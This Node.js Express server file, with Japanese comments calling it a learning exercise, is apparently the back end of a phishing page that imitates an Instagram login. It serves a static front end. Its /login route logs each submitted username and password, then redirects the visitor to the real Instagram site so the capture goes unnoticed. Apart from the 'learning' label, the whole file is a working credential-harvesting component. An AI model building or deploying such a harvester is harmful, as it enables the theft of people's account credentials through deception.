const express = require('express');
const cors = require('cors');

const app = express();

// 学習用に全オリジンを許可
app.use(cors({
  origin: '*',
  methods: ['GET','POST','OPTIONS'],
  allowedHeaders: ['Content-Type']
}));

// フォーム送信用
app.use(express.urlencoded({ extended: true }));
// JSON 送信にも対応（必要なら）
app.use(express.json());

// OPTIONS preflight も受け付け
app.options('*', (req, res) => {
  res.sendStatus(200);
});

// 静的ファイル配信（フロント HTML 置き場）
app.use(express.static('frontend'));

// ログイン API
app.post('/login', (req, res) => {
  console.log('🔥 /login に来た');
  console.log(req.body); // { username, password } が入る

  // 学習用リダイレクト（送信後に Instagram 公式へ遷移）
  res.redirect('https://www.instagram.com/');
});

// サーバー起動
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`API 起動中：${PORT}`);
});






